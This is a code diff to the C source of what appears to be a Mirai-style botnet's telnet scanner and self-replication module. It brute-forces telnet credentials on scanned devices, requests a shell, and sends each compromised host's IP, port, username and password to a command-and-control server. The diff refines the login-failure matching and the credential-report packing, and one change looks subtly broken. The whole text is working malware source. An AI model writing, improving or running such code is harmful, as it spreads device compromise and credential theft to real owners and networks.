@@ -6,9 +6,17 @@
 
 #ifdef SELFREP
 
+/* ============================================================================
+ * TELNET SCANNER - Self-Replication Module
+ * ============================================================================
+ * Reduced scanner settings to prevent crashes and network saturation
+ * Scans for vulnerable telnet devices and brute-forces credentials
+ * Reports successful logins back to C&C server
+ * ============================================================================ */
+
 /* Reduced scanner settings to prevent crashes and network saturation */
-#define SCANNER_MAX_CONNS 64          /* Reduced from 256 */
-#define SCANNER_RAW_PPS 32            /* Reduced from 384 - much slower rate */
+#define SCANNER_MAX_CONNS 64          /* Reduced from 256 - prevents resource exhaustion */
+#define SCANNER_RAW_PPS 32            /* Reduced from 384 - slower scan rate */
 #define SCANNER_CONNECTION_DELAY 500  /* Milliseconds between new connections */
 
 /* Scanner states */
@@ -406,7 +414,7 @@ static void scanner_connect(struct scanner_connection *conn) {
     conn->state = SC_CONNECTING;
     conn->connect_time = time(NULL);
     conn->last_recv = time(NULL);
-    conn->cred_index = 0;  /* Start with first credential */
+    iac_pos = 0;  /* Reset IAC position */
 }
 
 static void scanner_close(struct scanner_connection *conn) {
@@ -488,16 +496,11 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
 
         case SC_WAITING_PASSWD_RESP:
             if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
-                util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
+                util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect") ||
+                util_stristr(buf, n, "wrong") || util_stristr(buf, n, "denied")) {
                 /* Login failed, try next credential */
                 conn->cred_index++;
-                if (credentials[conn->cred_index].username != NULL) {
-                    /* Try next credential */
-                    scanner_close(conn);
-                } else {
-                    /* No more credentials */
-                    scanner_close(conn);
-                }
+                scanner_close(conn);
             } else {
                 /* Try to get shell */
                 send(conn->fd, "shell\r\n", 7, 0);
@@ -509,9 +512,13 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
             if (util_stristr(buf, n, "shell") || util_stristr(buf, n, "#") ||
                 util_stristr(buf, n, "$") || util_stristr(buf, n, ">")) {
                 /* Got shell - report to C&C */
-                uint8_t report[16];
+                uint8_t report[32];
                 uint32_t addr = conn->dst_addr;
                 uint16_t port = htons(conn->dst_port);
+                char *username = credentials[conn->cred_index].username;
+                char *password = credentials[conn->cred_index].password;
+                int user_len = util_strlen(username);
+                int pass_len = util_strlen(password);
 
                 report[0] = (addr >> 24) & 0xFF;
                 report[1] = (addr >> 16) & 0xFF;
@@ -519,10 +526,10 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
                 report[3] = addr & 0xFF;
                 report[4] = (port >> 8) & 0xFF;
                 report[5] = port & 0xFF;
-                report[6] = util_strlen(credentials[conn->cred_index].username);
-                memcpy(report + 7, credentials[conn->cred_index].username, report[6]);
-                report[7 + report[6]] = util_strlen(credentials[conn->cred_index].password);
-                memcpy(report + 8 + report[6], credentials[conn->cred_index].password, report[7 + report[6]]);
+                report[6] = (uint8_t)user_len;
+                memcpy(report + 7, username, user_len);
+                report[7 + user_len] = (uint8_t)pass_len;
+                memcpy(report + 8 + user_len, password, pass_len);
 
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
                 struct sockaddr_in cnc;
@@ -531,7 +538,7 @@ static void scanner_handle_recv(struct scanner_connection *conn) {
                 cnc.sin_port = htons(SCAN_CB_PORT);
 
                 if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
-                    send(fd, report, 8 + report[6] + report[7 + report[6]], 0);
+                    send(fd, report, 8 + user_len + pass_len, 0);
                 }
                 close(fd);
 
